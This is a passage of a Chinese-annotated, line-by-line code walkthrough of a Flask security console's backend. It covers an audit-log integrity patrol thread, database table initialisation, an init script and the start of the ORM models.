| 31 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    log_dir = app.config.get("GUARDIAN_LOG_DIR", "logs")` |
| 32 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    integrity_on = bool(app.config.get("LOG_INTEGRITY_ENABLED", True))` |
| 33 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    sl = SecurityLogger(log_dir=log_dir, enable_integrity=integrity_on)` |
| 34 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    result = sl.verify_integrity()` |
| 35 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    valid = bool(result.get("valid"))` |
| 36 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    _last_audit_integrity_valid = valid` |
| 37 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 38 | 条件判断：满足条件时进入对应分支。 | `    if valid:` |
| 39 | 返回结果：把处理后的值交回调用方。 | `        return result` |
| 40 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 41 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    now_m = time.monotonic()` |
| 42 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    invalid_lines = result.get("invalid_lines") or []` |
| 43 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    preview = invalid_lines[:8]` |
| 44 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    summary = f"invalid_lines={len(invalid_lines)} preview={preview!r}"` |
| 45 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 46 | 异常保护：尝试执行可能失败的逻辑。 | `    try:` |
| 47 | 函数调用：执行已有函数/方法完成当前步骤。 | `        sl.log_event(` |
| 48 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            event_type="audit_integrity",` |
| 49 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            level="critical",` |
| 50 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            details={` |
| 51 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                "message": "security.log 哈希链校验失败",` |
| 52 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                "total_lines": result.get("total_lines"),` |
| 53 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                "invalid_preview": preview,` |
| 54 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                "invalid_count": len(invalid_lines),` |
| 55 | 代码语句：参与当前文件的业务流程或数据处理。 | `            },` |
| 56 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            source_ip="",` |
| 57 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            confidence=1.0,` |
| 58 | 函数调用：执行已有函数/方法完成当前步骤。 | `        )` |
| 59 | 异常处理：捕获错误并执行降级或记录逻辑。 | `    except Exception as exc:  # noqa: BLE001` |
| 60 | 日志记录：输出运行状态、调试信息或异常线索。 | `        logger.error("[AuditPatrol] 写入审计失败: %s", exc)` |
| 61 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 62 | 注释：解释下面或当前这段代码的设计意图。 | `    # 测试环境下禁用冷却，避免跨用例共享模块全局状态导致漏写告警。` |
| 63 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    testing = bool(app.config.get("TESTING", False))` |
| 64 | 条件判断：满足条件时进入对应分支。 | `    if (not testing) and (` |
| 65 | 代码语句：参与当前文件的业务流程或数据处理。 | `        now_m - _last_critical_alert_monotonic < _CRITICAL_ALERT_COOLDOWN_SEC` |
| 66 | 代码语句：参与当前文件的业务流程或数据处理。 | `    ):` |
| 67 | 返回结果：把处理后的值交回调用方。 | `        return result` |
| 68 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    _last_critical_alert_monotonic = now_m` |
| 69 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 70 | 函数定义：声明 `_persist_critical_alert` 的输入、处理逻辑和返回结果。 | `    def _persist_critical_alert() -> None:` |
| 71 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        aid = uuid.uuid4().hex` |
| 72 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        ts_ms = int(time.time() * 1000)` |
| 73 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        alert = Alert(` |
| 74 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            id=aid,` |
| 75 | 注释：解释下面或当前这段代码的设计意图。 | `            # 避免同秒多次巡检触发 UNIQUE 冲突（external_id 全局唯一）` |
| 76 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            external_id=f"audit-integrity-{ts_ms}-{aid[:8]}",` |
| 77 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            timestamp=datetime.now(timezone.utc),` |
| 78 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            source_ip="127.0.0.1",` |
| 79 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            threat_type="audit_integrity",` |
| 80 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            level="critical",` |
| 81 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            confidence=1.0,` |
| 82 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            engine="audit-patrol",` |
| 83 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            status="open",` |
| 84 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            summary="审计日志哈希链完整性校验失败",` |
| 85 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            raw_payload=None,` |
| 86 | 函数调用：执行已有函数/方法完成当前步骤。 | `        )` |
| 87 | 函数调用：执行已有函数/方法完成当前步骤。 | `        db.session.add(alert)` |
| 88 | 函数调用：执行已有函数/方法完成当前步骤。 | `        db.session.add(` |
| 89 | 函数调用：执行已有函数/方法完成当前步骤。 | `            AlertHistory(` |
| 90 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                alert_id=aid,` |
| 91 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                from_status=None,` |
| 92 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                to_status="open",` |
| 93 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                operator="system",` |
| 94 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                note=summary[:2000],` |
| 95 | 函数调用：执行已有函数/方法完成当前步骤。 | `            )` |
| 96 | 函数调用：执行已有函数/方法完成当前步骤。 | `        )` |
| 97 | 函数调用：执行已有函数/方法完成当前步骤。 | `        db.session.commit()` |
| 98 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 99 | 异常保护：尝试执行可能失败的逻辑。 | `    try:` |
| 100 | 导入对象：从指定模块引入类、函数或常量。 | `        from flask import has_app_context` |
| 101 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 102 | 条件判断：满足条件时进入对应分支。 | `        if has_app_context():` |
| 103 | 函数调用：执行已有函数/方法完成当前步骤。 | `            _persist_critical_alert()` |
| 104 | 兜底分支：处理前面条件都不满足的情况。 | `        else:` |
| 105 | 上下文管理：自动管理资源打开与释放。 | `            with app.app_context():` |
| 106 | 函数调用：执行已有函数/方法完成当前步骤。 | `                _persist_critical_alert()` |
| 107 | 异常处理：捕获错误并执行降级或记录逻辑。 | `    except Exception as exc:  # noqa: BLE001` |
| 108 | 日志记录：输出运行状态、调试信息或异常线索。 | `        logger.error("[AuditPatrol] 写入告警表失败: %s", exc)` |
| 109 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 110 | 返回结果：把处理后的值交回调用方。 | `    return result` |
| 111 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 112 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 113 | 函数定义：声明 `_patrol_loop` 的输入、处理逻辑和返回结果。 | `def _patrol_loop(app: Any, interval_sec: float, stop_event: threading.Event) -> None:` |
| 114 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    interval_sec = max(5.0, interval_sec)` |
| 115 | 循环：在条件成立期间重复执行逻辑。 | `    while not stop_event.is_set():` |
| 116 | 异常保护：尝试执行可能失败的逻辑。 | `        try:` |
| 117 | 上下文管理：自动管理资源打开与释放。 | `            with app.app_context():` |
| 118 | 函数调用：执行已有函数/方法完成当前步骤。 | `                run_audit_integrity_patrol_once(app)` |
| 119 | 异常处理：捕获错误并执行降级或记录逻辑。 | `        except Exception as exc:  # noqa: BLE001` |
| 120 | 日志记录：输出运行状态、调试信息或异常线索。 | `            logger.warning("[AuditPatrol] 巡检异常: %s", exc)` |
| 121 | 条件判断：满足条件时进入对应分支。 | `        if stop_event.wait(timeout=interval_sec):` |
| 122 | 跳出循环：提前结束当前循环。 | `            break` |
| 123 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 124 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 125 | 函数定义：声明 `start_audit_integrity_patrol` 的输入、处理逻辑和返回结果。 | `def start_audit_integrity_patrol(app: Any) -> Optional[threading.Thread]:` |
| 126 | 文档字符串：说明当前模块、类或函数的职责。 | `    """启动后台巡检线程；测试环境可通过环境变量关闭。"""` |
| 127 | 导入模块：引入标准库或第三方依赖供后续代码使用。 | `    import os` |
| 128 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 129 | 条件判断：满足条件时进入对应分支。 | `    if os.environ.get("AUDIT_INTEGRITY_PATROL", "true").lower() != "true":` |
| 130 | 返回结果：把处理后的值交回调用方。 | `        return None` |
| 131 | 注释：解释下面或当前这段代码的设计意图。 | `    # pytest 进程退出阶段会先关闭 stderr/stdout，再清理后台线程。` |
| 132 | 注释：解释下面或当前这段代码的设计意图。 | `    # 默认在测试中不启巡检，避免 logging StreamHandler 对 closed file 写入。` |
| 133 | 条件判断：满足条件时进入对应分支。 | `    if os.environ.get("PYTEST_CURRENT_TEST") and (` |
| 134 | 函数调用：执行已有函数/方法完成当前步骤。 | `        os.environ.get("AUDIT_INTEGRITY_PATROL_IN_TESTS", "false").lower() != "true"` |
| 135 | 代码语句：参与当前文件的业务流程或数据处理。 | `    ):` |
| 136 | 返回结果：把处理后的值交回调用方。 | `        return None` |
| 137 | 异常保护：尝试执行可能失败的逻辑。 | `    try:` |
| 138 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        interval = float(os.environ.get("AUDIT_INTEGRITY_INTERVAL_SEC", "60"))` |
| 139 | 异常处理：捕获错误并执行降级或记录逻辑。 | `    except ValueError:` |
| 140 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        interval = 60.0` |
| 141 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    interval = max(15.0, interval)` |
| 142 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 143 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    stop_event = threading.Event()` |
| 144 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    app.extensions["audit_integrity_patrol_stop"] = stop_event` |
| 145 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 146 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    t = threading.Thread(` |
| 147 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        target=_patrol_loop,` |
| 148 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        args=(app, interval, stop_event),` |
| 149 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        name="audit-integrity-patrol",` |
| 150 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        daemon=True,` |
| 151 | 函数调用：执行已有函数/方法完成当前步骤。 | `    )` |
| 152 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    app.extensions["audit_integrity_patrol_thread"] = t` |
| 153 | 函数调用：执行已有函数/方法完成当前步骤。 | `    t.start()` |
| 154 | 返回结果：把处理后的值交回调用方。 | `    return t` |
| 155 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 156 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 157 | 函数定义：声明 `stop_audit_integrity_patrol` 的输入、处理逻辑和返回结果。 | `def stop_audit_integrity_patrol(app: Any, join_timeout_sec: float = 2.0) -> None:` |
| 158 | 文档字符串：说明当前模块、类或函数的职责。 | `    """停止后台巡检线程，避免进程退出后后台线程继续写日志。"""` |
| 159 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    stop_event = app.extensions.get("audit_integrity_patrol_stop")` |
| 160 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    t = app.extensions.get("audit_integrity_patrol_thread")` |
| 161 | 条件判断：满足条件时进入对应分支。 | `    if stop_event is None:` |
| 162 | 返回结果：把处理后的值交回调用方。 | `        return` |
| 163 | 异常保护：尝试执行可能失败的逻辑。 | `    try:` |
| 164 | 函数调用：执行已有函数/方法完成当前步骤。 | `        stop_event.set()` |
| 165 | 异常处理：捕获错误并执行降级或记录逻辑。 | `    except Exception:  # noqa: BLE001` |
| 166 | 返回结果：把处理后的值交回调用方。 | `        return` |
| 167 | 条件判断：满足条件时进入对应分支。 | `    if isinstance(t, threading.Thread) and t.is_alive():` |
| 168 | 函数调用：执行已有函数/方法完成当前步骤。 | `        t.join(timeout=max(0.1, float(join_timeout_sec)))` |

## `web/database.py`

- 类型：Web 后端支撑
- 行数：102

| 行号 | 备注 | 原始代码 |
|---:|---|---|
| 1 | 文档字符串：说明当前模块、类或函数的职责。 | `"""Flask-SQLAlchemy 扩展与表初始化工具（R2 持久化基础）。"""` |
| 2 | 兼容性导入：启用较新的 Python 语义。 | `from __future__ import annotations` |
| 3 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 4 | 导入模块：引入标准库或第三方依赖供后续代码使用。 | `import logging` |
| 5 | 导入模块：引入标准库或第三方依赖供后续代码使用。 | `import os` |
| 6 | 导入对象：从指定模块引入类、函数或常量。 | `from pathlib import Path` |
| 7 | 导入对象：从指定模块引入类、函数或常量。 | `from typing import TYPE_CHECKING` |
| 8 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 9 | 导入对象：从指定模块引入类、函数或常量。 | `from flask import Flask` |
| 10 | 导入对象：从指定模块引入类、函数或常量。 | `from flask_sqlalchemy import SQLAlchemy` |
| 11 | 导入对象：从指定模块引入类、函数或常量。 | `from sqlalchemy import inspect, text` |
| 12 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 13 | 条件判断：满足条件时进入对应分支。 | `if TYPE_CHECKING:` |
| 14 | 占位语句：保持语法完整但当前不执行操作。 | `    pass` |
| 15 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 16 | 日志记录：输出运行状态、调试信息或异常线索。 | `logger = logging.getLogger(__name__)` |
| 17 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 18 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `db = SQLAlchemy()` |
| 19 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 20 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 21 | 函数定义：声明 `ensure_sqlite_parent_dir` 的输入、处理逻辑和返回结果。 | `def ensure_sqlite_parent_dir(app: Flask) -> None:` |
| 22 | 文档字符串：说明当前模块、类或函数的职责。 | `    """若使用基于文件的 SQLite，确保数据库文件所在目录存在。"""` |
| 23 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    uri = app.config.get("SQLALCHEMY_DATABASE_URI") or ""` |
| 24 | 条件判断：满足条件时进入对应分支。 | `    if not uri.startswith("sqlite:"):` |
| 25 | 返回结果：把处理后的值交回调用方。 | `        return` |
| 26 | 异常保护：尝试执行可能失败的逻辑。 | `    try:` |
| 27 | 导入对象：从指定模块引入类、函数或常量。 | `        from sqlalchemy.engine import make_url` |
| 28 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 29 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        url = make_url(uri)` |
| 30 | 异常处理：捕获错误并执行降级或记录逻辑。 | `    except Exception:  # noqa: BLE001` |
| 31 | 返回结果：把处理后的值交回调用方。 | `        return` |
| 32 | 条件判断：满足条件时进入对应分支。 | `    if url.database in (None, "", ":memory:"):` |
| 33 | 返回结果：把处理后的值交回调用方。 | `        return` |
| 34 | 注释：解释下面或当前这段代码的设计意图。 | `    # Flask-SQLAlchemy resolves relative sqlite:/// paths from app.instance_path.` |
| 35 | 注释：解释下面或当前这段代码的设计意图。 | `    # Create the same parent directory the engine will actually use.` |
| 36 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    db_path = Path(url.database)` |
| 37 | 条件判断：满足条件时进入对应分支。 | `    if not db_path.is_absolute():` |
| 38 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        db_path = Path(app.instance_path) / db_path` |
| 39 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    parent = db_path.parent` |
| 40 | 条件判断：满足条件时进入对应分支。 | `    if parent and str(parent) not in (".", ""):` |
| 41 | 函数调用：执行已有函数/方法完成当前步骤。 | `        parent.mkdir(parents=True, exist_ok=True)` |
| 42 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 43 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 44 | 函数定义：声明 `ensure_ioc_schema_compat` 的输入、处理逻辑和返回结果。 | `def ensure_ioc_schema_compat(engine) -> None:` |
| 45 | 文档字符串：说明当前模块、类或函数的职责。 | `    """为已有 SQLite 库补齐 IOC 生产化字段（create_all 不会 ALTER 旧表）。"""` |
| 46 | 条件判断：满足条件时进入对应分支。 | `    if engine.dialect.name != "sqlite":` |
| 47 | 返回结果：把处理后的值交回调用方。 | `        return` |
| 48 | 异常保护：尝试执行可能失败的逻辑。 | `    try:` |
| 49 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        insp = inspect(engine)` |
| 50 | 条件判断：满足条件时进入对应分支。 | `        if "iocs" not in insp.get_table_names():` |
| 51 | 返回结果：把处理后的值交回调用方。 | `            return` |
| 52 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        cols = {c["name"] for c in insp.get_columns("iocs")}` |
| 53 | 异常处理：捕获错误并执行降级或记录逻辑。 | `    except Exception:  # noqa: BLE001` |
| 54 | 返回结果：把处理后的值交回调用方。 | `        return` |
| 55 | 注释：解释下面或当前这段代码的设计意图。 | `    # (column, ddl_type) — SQLite 无原生 JSON 类型，用 TEXT 存 JSON` |
| 56 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    wanted: list[tuple[str, str]] = [` |
| 57 | 函数调用：执行已有函数/方法完成当前步骤。 | `        ("ttl_seconds", "INTEGER"),` |
| 58 | 函数调用：执行已有函数/方法完成当前步骤。 | `        ("first_seen", "TEXT"),` |
| 59 | 函数调用：执行已有函数/方法完成当前步骤。 | `        ("last_seen", "TEXT"),` |
| 60 | 函数调用：执行已有函数/方法完成当前步骤。 | `        ("expires_at", "TEXT"),` |
| 61 | 函数调用：执行已有函数/方法完成当前步骤。 | `        ("ioc_meta", "TEXT"),` |
| 62 | 代码语句：参与当前文件的业务流程或数据处理。 | `    ]` |
| 63 | 上下文管理：自动管理资源打开与释放。 | `    with engine.begin() as conn:` |
| 64 | 循环：逐个处理集合或迭代器中的元素。 | `        for name, ddl in wanted:` |
| 65 | 条件判断：满足条件时进入对应分支。 | `            if name in cols:` |
| 66 | 继续循环：跳过本轮剩余逻辑。 | `                continue` |
| 67 | 异常保护：尝试执行可能失败的逻辑。 | `            try:` |
| 68 | 函数调用：执行已有函数/方法完成当前步骤。 | `                conn.execute(text(f"ALTER TABLE iocs ADD COLUMN {name} {ddl}"))` |
| 69 | 日志记录：输出运行状态、调试信息或异常线索。 | `                logger.info("[DB] iocs 表已添加列: %s", name)` |
| 70 | 异常处理：捕获错误并执行降级或记录逻辑。 | `            except Exception as exc:  # noqa: BLE001` |
| 71 | 日志记录：输出运行状态、调试信息或异常线索。 | `                logger.warning("[DB] iocs 添加列 %s 失败: %s", name, exc)` |
| 72 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 73 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 74 | 函数定义：声明 `init_db_tables` 的输入、处理逻辑和返回结果。 | `def init_db_tables(app: Flask, *, force: bool = False) -> None:` |
| 75 | 文档字符串：说明当前模块、类或函数的职责。 | `    """创建 ORM 定义的全部表。` |
| 76 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 77 | 代码语句：参与当前文件的业务流程或数据处理。 | `    - development / testing：启动时自动调用（一键开发）。` |
| 78 | 代码语句：参与当前文件的业务流程或数据处理。 | `    - production：默认不在启动时建表，请使用 \`\`python -m web.init_db\`\`；` |
| 79 | 代码语句：参与当前文件的业务流程或数据处理。 | `      若设置环境变量 \`\`AUTO_CREATE_DB_TABLES=true\`\` 则也会在启动时建表（应急/演示）。` |
| 80 | 文档字符串边界：开始或结束模块/类/函数说明。 | `    """` |
| 81 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    env = os.environ.get("FLASK_ENV", "development")` |
| 82 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    auto_prod = os.environ.get("AUTO_CREATE_DB_TABLES", "").lower() == "true"` |
| 83 | 条件判断：满足条件时进入对应分支。 | `    if env == "production" and not force and not auto_prod:` |
| 84 | 日志记录：输出运行状态、调试信息或异常线索。 | `        logger.info(` |
| 85 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            "[DB] 生产环境跳过自动建表；首次请执行: python -m web.init_db "` |
| 86 | 代码语句：参与当前文件的业务流程或数据处理。 | `            "（或设置 AUTO_CREATE_DB_TABLES=true 仅限应急）"` |
| 87 | 函数调用：执行已有函数/方法完成当前步骤。 | `        )` |
| 88 | 返回结果：把处理后的值交回调用方。 | `        return` |
| 89 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 90 | 函数调用：执行已有函数/方法完成当前步骤。 | `    ensure_sqlite_parent_dir(app)` |
| 91 | 上下文管理：自动管理资源打开与释放。 | `    with app.app_context():` |
| 92 | 函数调用：执行已有函数/方法完成当前步骤。 | `        db.create_all()` |
| 93 | 函数调用：执行已有函数/方法完成当前步骤。 | `        ensure_ioc_schema_compat(db.engine)` |
| 94 | 日志记录：输出运行状态、调试信息或异常线索。 | `    logger.info("[DB] SQLAlchemy create_all 已完成 (env=%s)", env)` |
| 95 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 96 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 97 | 函数定义：声明 `init_db_command` 的输入、处理逻辑和返回结果。 | `def init_db_command(app: Flask) -> None:` |
| 98 | 文档字符串：说明当前模块、类或函数的职责。 | `    """CLI / 模块入口：无条件建表（任意 FLASK_ENV）。"""` |
| 99 | 函数调用：执行已有函数/方法完成当前步骤。 | `    ensure_sqlite_parent_dir(app)` |
| 100 | 上下文管理：自动管理资源打开与释放。 | `    with app.app_context():` |
| 101 | 函数调用：执行已有函数/方法完成当前步骤。 | `        db.create_all()` |
| 102 | 函数调用：执行已有函数/方法完成当前步骤。 | `        ensure_ioc_schema_compat(db.engine)` |

## `web/init_db.py`

- 类型：Web 后端支撑
- 行数：25

| 行号 | 备注 | 原始代码 |
|---:|---|---|
| 1 | 文档字符串：说明当前模块、类或函数的职责。 | `"""数据库初始化入口（R2）。` |
| 2 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 3 | 代码语句：参与当前文件的业务流程或数据处理。 | `用法：` |
| 4 | 代码语句：参与当前文件的业务流程或数据处理。 | `    python -m web.init_db` |
| 5 | 文档字符串边界：开始或结束模块/类/函数说明。 | `"""` |
| 6 | 兼容性导入：启用较新的 Python 语义。 | `from __future__ import annotations` |
| 7 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 8 | 导入模块：引入标准库或第三方依赖供后续代码使用。 | `import logging` |
| 9 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 10 | 导入对象：从指定模块引入类、函数或常量。 | `from web.app import create_app` |
| 11 | 导入对象：从指定模块引入类、函数或常量。 | `from web.database import init_db_command` |
| 12 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 13 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 14 | 函数定义：声明 `main` 的输入、处理逻辑和返回结果。 | `def main() -> None:` |
| 15 | 日志记录：输出运行状态、调试信息或异常线索。 | `    logging.basicConfig(` |
| 16 | 日志记录：输出运行状态、调试信息或异常线索。 | `        level=logging.INFO,` |
| 17 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        format="[%(asctime)s] %(name)s - %(levelname)s - %(message)s",` |
| 18 | 函数调用：执行已有函数/方法完成当前步骤。 | `    )` |
| 19 | 函数调用：执行已有函数/方法完成当前步骤。 | `    app, _ = create_app()` |
| 20 | 函数调用：执行已有函数/方法完成当前步骤。 | `    init_db_command(app)` |
| 21 | 函数调用：执行已有函数/方法完成当前步骤。 | `    print("Database tables created successfully.")` |
| 22 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 23 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 24 | 条件判断：满足条件时进入对应分支。 | `if __name__ == "__main__":` |
| 25 | 函数调用：执行已有函数/方法完成当前步骤。 | `    main()` |

## `web/models.py`

- 类型：Web 后端支撑
- 行数：273

| 行号 | 备注 | 原始代码 |
|---:|---|---|
| 1 | 文档字符串：说明当前模块、类或函数的职责。 | `"""Web 控制台持久化 ORM 模型（生产 v1.0 数据面）。` |
| 2 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 3 | 代码语句：参与当前文件的业务流程或数据处理。 | `业务真源为数据库表：告警、流转历史、规则、IOC、设置、封禁等；进程内` |
| 4 | 代码语句：参与当前文件的业务流程或数据处理。 | `\`\`_ServerState\`\` 仅作缓存/推送兼容，不得作为唯一数据源。` |
| 5 | 文档字符串边界：开始或结束模块/类/函数说明。 | `"""` |
| 6 | 兼容性导入：启用较新的 Python 语义。 | `from __future__ import annotations` |
| 7 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 8 | 导入对象：从指定模块引入类、函数或常量。 | `from datetime import datetime, timezone` |
| 9 | 导入对象：从指定模块引入类、函数或常量。 | `from typing import Any, List, Optional` |
| 10 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 11 | 导入对象：从指定模块引入类、函数或常量。 | `from sqlalchemy import (` |
| 12 | 代码语句：参与当前文件的业务流程或数据处理。 | `    JSON,` |
| 13 | 代码语句：参与当前文件的业务流程或数据处理。 | `    Boolean,` |
| 14 | 代码语句：参与当前文件的业务流程或数据处理。 | `    DateTime,` |
| 15 | 代码语句：参与当前文件的业务流程或数据处理。 | `    Float,` |
| 16 | 代码语句：参与当前文件的业务流程或数据处理。 | `    ForeignKey,` |
| 17 | 代码语句：参与当前文件的业务流程或数据处理。 | `    Index,` |
| 18 | 代码语句：参与当前文件的业务流程或数据处理。 | `    Integer,` |
| 19 | 代码语句：参与当前文件的业务流程或数据处理。 | `    String,` |
| 20 | 代码语句：参与当前文件的业务流程或数据处理。 | `    Text,` |
| 21 | 代码语句：参与当前文件的业务流程或数据处理。 | `    UniqueConstraint,` |
| 22 | 函数调用：执行已有函数/方法完成当前步骤。 | `)` |
| 23 | 导入对象：从指定模块引入类、函数或常量。 | `from sqlalchemy.orm import Mapped, mapped_column, relationship` |
| 24 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 25 | 导入对象：从指定模块引入类、函数或常量。 | `from web.database import db` |
| 26 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 27 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 28 | 函数定义：声明 `_utc_now` 的输入、处理逻辑和返回结果。 | `def _utc_now() -> datetime:` |
| 29 | 返回结果：把处理后的值交回调用方。 | `    return datetime.now(timezone.utc)` |
| 30 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 31 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 32 | 类定义：声明 `Alert`，封装相关状态与行为。 | `class Alert(db.Model):` |
| 33 | 文档字符串：说明当前模块、类或函数的职责。 | `    """告警主表。"""` |
| 34 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 35 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    __tablename__ = "alerts"` |
| 36 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    __table_args__ = (` |
| 37 | 函数调用：执行已有函数/方法完成当前步骤。 | `        Index("ix_alerts_status_ts", "status", "timestamp"),` |
| 38 | 函数调用：执行已有函数/方法完成当前步骤。 | `        UniqueConstraint("external_id", name="uq_alerts_external_id"),` |
